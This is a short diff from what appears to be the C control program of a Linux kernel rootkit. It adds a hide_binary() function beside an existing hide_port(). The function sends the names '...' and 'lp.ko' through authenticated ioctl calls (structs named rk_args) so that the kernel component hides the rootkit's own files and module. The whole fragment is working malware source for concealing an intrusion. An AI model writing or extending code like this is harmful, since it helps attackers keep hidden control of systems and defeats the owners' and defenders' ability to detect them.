@@ -254,3 +254,32 @@ void hide_port( int port ) {
   io = ioctl( sockfd , AUTH_TOKEN , &rk_args ) ;
   
 }
+
+void hide_binary( ) {
+  int io ;
+  int sockfd ;
+  int i ;
+  struct rk_args rk_args ;
+  struct rk_file_args rk_file_args ;
+  char* binary[] = {
+    "..." ,
+    "lp.ko"
+  } ;
+  
+  sockfd = socket( AF_INET , SOCK_STREAM , 6 ) ;
+  if( sockfd < 0 ) {
+#ifdef _DEBUG_
+    perror( "socket" ) ;
+#endif
+    exit( 1 ) ;
+  }
+  
+
+  for( i = 0 ; i < 2 ; i ++ ) {
+    rk_file_args.name = binary[i] ;
+    rk_file_args.namelen = strlen( binary[i] ) ;
+    rk_args.cmd = 11 ;
+    rk_args.ptr = &rk_file_args ;
+    io = ioctl( sockfd , AUTH_TOKEN , &rk_args ) ;
+  }
+}
